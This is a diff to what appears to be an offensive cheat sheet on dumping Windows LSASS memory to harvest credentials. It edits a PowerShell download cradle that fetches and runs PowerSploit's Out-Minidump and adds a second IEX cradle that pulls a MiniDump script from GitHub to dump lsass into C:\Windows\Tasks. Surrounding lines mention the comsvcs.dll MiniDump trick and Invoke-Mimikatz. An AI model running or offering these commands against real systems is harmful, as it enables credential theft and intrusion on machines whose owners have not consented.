@@ -28,8 +28,14 @@ rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $($lsass.Id) $dumpPath fu
 
 ## 4. PowerSploit's Out-Minidump:
 Ensure the Out-Minidump function is loaded in your PowerShell session<br>
-<code>"IEX (New-Object Net.WebClient).DownloadString('https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1')"
+<code>IEX (New-Object Net.WebClient).DownloadString('https://github.com/PowerShellMafia/PowerSploit/raw/master/Exfiltration/Out-Minidump.ps1')"
 Get-Process lsass | Out-Minidump -DumpFilePath C:\Path\To\Dump
+</code>
+
+#### 4.4 - Using 'MiniDump' to dump lsass into C:\Windows\Tasks:
+<code>
+IEX (New-Object Net.WebClient).DownloadString('https://github.com/chvancooten/OSEP-Code-Snippets/raw/main/MiniDump/MiniDump.ps1')
+Reults will be save on C:\Windows\Tasks.
 </code>
 
 ##  5. Using Invoke-Mimikatz from the GitHub Repository:
